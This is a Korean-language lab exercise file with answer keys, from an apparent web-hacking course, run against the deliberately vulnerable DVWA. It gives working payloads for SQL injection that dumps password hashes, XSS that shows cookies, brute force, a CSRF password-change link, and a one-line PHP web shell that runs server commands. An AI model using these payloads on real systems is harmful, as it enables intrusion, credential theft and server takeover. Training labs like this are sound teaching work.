lab_id: ezweb-week03
title: "DVWA로 직접 해보는 웹 해킹 — SQLi·XSS·인증우회·CSRF·웹셸"
course: ai-web-hacking
week: 3
description: |
  웹의 작동 원리를 개발자도구로 직접 본 뒤, 연습용 표적 DVWA에서 5대 웹 해킹을 내 손으로
  성공시킨다. 모든 페이로드(넣을 글자)와 '화면에 보여야 할 것'을 정확히 적어 두었으니 그대로만
  따라하면 변수 없이 똑같은 결과가 나온다. 표적 DVWA는 반드시 Security=Low 로 둔다.
  공격은 학생 브라우저(공격자 VM)에서, 표적은 희생자 VM의 DVWA(:8088)다.
difficulty: medium
duration_minutes: 300
prerequisites:
  - "Week 02 통과(터미널/파일 다루기), 보안 서약 유효"
  - "희생자 VM에서 ./start.sh 로 DVWA 기동, http://<victim-ip>:8088 접속 가능"
  - "DVWA: admin/password 로그인 → Create/Reset Database → Security=Low 설정 완료"
objectives:
  - "개발자도구로 쿠키/요청을 관찰한다"
  - "SQL 인젝션으로 회원 비밀번호 해시 목록을 추출한다"
  - "XSS로 경고창·쿠키 출력을 띄운다"
  - "인증우회(무제한 시도)와 CSRF(비밀번호 무단 변경)를 재현한다"
  - "PHP 웹셸을 업로드해 서버에서 명령을 실행한다"
pass_threshold: 0.7
steps:

  - order: 1
    instruction: |
      ## 🎯 목표
      웹이 무엇을 주고받는지 개발자도구로 직접 본다.
      ## 개념 한 줄
      쿠키(입장 도장)와 요청을 볼 줄 알아야 어디를 비틀지 알 수 있다.
      ## 💻 해보기
      1. DVWA 로그인 상태에서 키보드 `F12` → 개발자도구 열기.
      2. **Application(또는 저장소) → Cookies** 에서 `PHPSESSID`, `security=low` 를 찾는다.
      3. **Network(네트워크)** 탭을 켠 채 페이지를 새로고침 → 오간 요청 목록을 본다.
      ## ✅ 합격 기준
      `PHPSESSID` 쿠키 값과 `security=low` 를 화면에서 찾아낸다.
      ## 🧰 옵션 풀이
      - `PHPSESSID` = 내 로그인 '입장 도장'. 이 값이 곧 내 세션이다.
      - `security=low` = DVWA 난이도. low 여야 실습이 그대로 통한다.
    hint: "F12 → Application → Cookies"
    category: recon
    points: 10
    answer: |
      F12 → Cookies 에서 PHPSESSID=<랜덤값>, security=low 확인.
    answer_detail: "공격 전 관찰 단계. 세션 쿠키와 보안등급을 눈으로 확인하면 통과. 이후 XSS에서 이 쿠키를 훔치는 실습으로 연결된다."
    verify:
      type: manual
      check: "PHPSESSID 와 security=low 쿠키를 찾았다."
    target: victim

  - order: 2
    instruction: |
      ## 🎯 목표
      SQL 인젝션으로 모든 회원의 아이디와 비밀번호(해시)를 뽑는다.
      ## 개념 한 줄
      입력칸에 SQL을 끼워 넣으면, 서버가 그걸 명령으로 실행해 숨은 테이블(비밀번호)까지 내준다.
      ## 💻 해보기
      1. 좌측 메뉴 **SQL Injection** 클릭.
      2. **User ID** 입력칸에 아래를 '그대로' 붙여넣고 Submit:
         ```
         1' UNION SELECT user, password FROM users #
         ```
      ## ✅ 합격 기준
      화면에 admin, gordonb 등 **여러 사용자명과 32자리 해시 문자열**이 줄줄이 나온다.
      ## 🧰 옵션 풀이
      - `UNION SELECT user, password FROM users` = 원래 결과 뒤에 '회원 테이블의 아이디·비번'을 이어붙임.
      - 끝의 `#` = 뒤따르는 원래 SQL을 주석 처리(무력화).
      - 해시는 비번을 암호화한 값. 이 자체가 '비번이 통째로 샜다'는 증거다.
    hint: "UNION SELECT user, password FROM users #"
    category: sqli
    points: 20
    answer: |
      User ID 칸에:  1' UNION SELECT user, password FROM users #
      → admin / 5f4dcc3b5aa765d61d8327deb882cf99 (=password) 등 전체 노출.
    answer_detail: "DVWA Low의 SQLi 쿼리는 입력을 그대로 문자열에 합쳐 실행한다. UNION으로 users 테이블의 user/password 컬럼을 결과에 이어붙여 전체 계정 해시를 노출시킨다. 사용자명+해시가 다수 보이면 성공. admin 해시는 'password'의 MD5다."
    verify:
      type: manual
      check: "여러 사용자명과 32자리 해시가 화면에 출력됨."
    target: victim

  - order: 3
    instruction: |
      ## 🎯 목표
      XSS로 경고창을 띄우고, 응용해서 내 쿠키(입장 도장)를 출력한다.
      ## 개념 한 줄
      입력에 <script>를 끼우면, 그 글을 보는 브라우저에서 내 코드가 실행된다.
      ## 💻 해보기
      1. 좌측 **XSS (Reflected)** 클릭.
      2. "What's your name?" 칸에 그대로 입력 후 Submit:
         ```
         <script>alert('XSS')</script>
         ```
         → 경고창이 뜬다.
      3. 이번엔 쿠키를 보자:
         ```
         <script>alert(document.cookie)</script>
         ```
         → 경고창에 PHPSESSID 가 그대로 보인다.
      ## ✅ 합격 기준
      두 번째 입력에서 경고창에 `PHPSESSID=...` 가 표시된다.
      ## 🧰 옵션 풀이
      - `alert(...)` = 경고창 띄우기. `document.cookie` = 현재 페이지의 쿠키 값.
      - 실제 공격에선 이 값을 공격자 서버로 몰래 전송해 '세션 탈취'를 한다(원리만 이해).
    hint: "<script>alert(document.cookie)</script>"
    category: xss
    points: 18
    answer: |
      이름 칸:  <script>alert('XSS')</script>   → 경고창
      이어서:   <script>alert(document.cookie)</script>  → PHPSESSID 노출
    answer_detail: "DVWA Low는 입력을 필터 없이 페이지에 출력해 스크립트가 실행된다. 두 번째 페이로드에서 경고창에 세션 쿠키가 보이면 성공 — 이 값을 외부로 빼돌리면 세션 탈취가 된다는 점을 설명한다."
    verify:
      type: manual
      check: "경고창에 PHPSESSID 쿠키가 표시됨."
    target: victim

  - order: 4
    instruction: |
      ## 🎯 목표
      로그인에 시도 제한이 없음을 확인하고(인증우회 토대), 약한 비번을 맞힌다.
      ## 개념 한 줄
      시도 횟수 제한(lockout)이 없으면 흔한 비번을 무한히 시도해 뚫을 수 있다.
      ## 💻 해보기
      1. 좌측 **Brute Force** 클릭.
      2. Username `admin`, Password 에 `123456` → Login (실패 메시지 확인).
      3. 다시 Password `password` → Login → "Welcome to the password protected area admin" 성공.
      4. 2~3번을 반복해도 계정이 잠기지 않음을 관찰한다(= 시도 제한 없음).
      ## ✅ 합격 기준
      여러 번 틀려도 잠금 없이, `admin`/`password` 로 로그인 성공 메시지가 뜬다.
      ## 🧰 옵션 풀이
      - 실패해도 잠기지 않는다 = 자동 도구로 수천 개 비번을 시도할 수 있다는 뜻(취약).
      - 방어책: 시도 제한·캡차·2단계 인증.
    hint: "여러 번 틀려도 안 잠긴다 → admin/password"
    category: auth
    points: 14
    answer: |
      admin/123456(실패) → admin/password(성공). 잠금 없음 = Brute Force 취약.
    answer_detail: "DVWA Low의 Brute Force는 rate-limit/lockout이 전혀 없다. 반복 실패 후에도 admin/password로 성공 메시지가 뜨면 통과. 자동화하면 사전공격이 그대로 통한다는 점이 핵심."
    verify:
      type: manual
      check: "잠금 없이 admin/password 로그인 성공 메시지 확인."
    target: victim

  - order: 5
    instruction: |
      ## 🎯 목표
      CSRF — 조작된 링크 하나로 admin 비밀번호가 바뀌게 만든다.
      ## 개념 한 줄
      로그인된 상태에서 위조된 요청을 보내면, 본인도 모르게 동작이 실행된다.
      ## 💻 해보기
      1. 좌측 **CSRF** 클릭(현재 admin 으로 로그인된 상태).
      2. 브라우저 주소창에 아래 주소를 직접 입력해 접속(<victim-ip> 는 실제 IP):
         ```
         http://<victim-ip>:8088/vulnerabilities/csrf/?password_new=hacked123&password_conf=hacked123&Change=Change#
         ```
      3. 화면에 "Password Changed" 가 뜬다 → 비번이 hacked123 으로 바뀜.
      ## ✅ 합격 기준
      "Password Changed" 메시지가 뜨고, 로그아웃 후 admin/hacked123 으로 로그인된다.
      ## 🧰 옵션 풀이
      - 이 주소를 피해자가 모르고 클릭하게 만들면(메일·이미지 등) 본인도 모르게 비번이 바뀐다.
      - 방어책: CSRF 토큰(요청마다 비밀 값) 검증.
      - ⚠️ 실습 후 비번을 원래대로 돌리려면 같은 방법으로 password_new=password 로 한 번 더.
    hint: "주소창에 password_new=... 링크 직접 접속"
    category: csrf
    points: 14
    answer: |
      http://<victim-ip>:8088/vulnerabilities/csrf/?password_new=hacked123&password_conf=hacked123&Change=Change#
      → "Password Changed"
    answer_detail: "DVWA Low의 CSRF는 토큰 검증이 없어, 로그인 세션만 있으면 GET 요청만으로 비번이 바뀐다. 'Password Changed'가 뜨고 새 비번으로 로그인되면 성공. 클릭 한 번의 위험을 체감하는 단계."
    verify:
      type: manual
      check: "'Password Changed' 후 새 비밀번호로 로그인됨."
    target: victim

  - order: 6
    instruction: |
      ## 🎯 목표
      파일 업로드로 PHP 웹셸을 올려, 서버에서 명령을 실행한다(오늘의 하이라이트).
      ## 개념 한 줄
      사진만 올려야 할 칸에 PHP 코드를 올려 막지 못하면, 그 파일로 서버를 조종할 수 있다.
      ## 💻 해보기
      1. 공격자 VM 터미널에서 웹셸 파일을 만든다(또는 claude에게 만들어달라고):
         ```bash
         echo '<?php system($_GET["c"]); ?>' > shell.php
         ```
      2. DVWA 좌측 **File Upload** → shell.php 선택 → Upload.
         업로드 성공 시 저장 경로가 표시된다(보통 ../../hackable/uploads/shell.php).
      3. 브라우저로 웹셸에 명령을 보낸다:
         ```
         http://<victim-ip>:8088/hackable/uploads/shell.php?c=id
         ```
         → 화면에 `uid=33(www-data) ...` 가 출력(서버에서 명령 실행됨).
      4. 한 번 더: `...shell.php?c=cat /etc/passwd` → 서버 계정 목록이 보인다.
      ## ✅ 합격 기준
      shell.php?c=id 접속 시 `uid=` 로 시작하는 서버 명령 결과가 화면에 나온다.
      ## 🧰 옵션 풀이
      - `<?php system($_GET["c"]); ?>` = URL의 c 값을 서버 명령으로 실행하는 한 줄 웹셸.
      - `id` = 현재 실행 사용자 확인. 서버가 통째로 내 통제 아래라는 가장 강력한 증거.
      - 방어책: 확장자·내용 검증, 업로드 폴더 실행 금지.
    hint: "echo '<?php system($_GET[\"c\"]); ?>' > shell.php 업로드 후 ?c=id"
    category: upload
    points: 25
    answer: |
      shell.php 업로드 → http://<victim-ip>:8088/hackable/uploads/shell.php?c=id
      → uid=33(www-data) gid=33(www-data) ...
    answer_detail: "DVWA Low는 업로드 파일의 확장자/내용을 검증하지 않아 PHP 웹셸이 그대로 실행된다. ?c=id 결과로 uid=가 보이면 원격 명령 실행(RCE) 성공 — 서버 장악을 의미하는 최고 강도의 시연이다. ?c=cat /etc/passwd 로 확장 확인."
    verify:
      type: manual
      check: "shell.php?c=id 에서 uid= 로 시작하는 출력이 보인다."
    target: victim
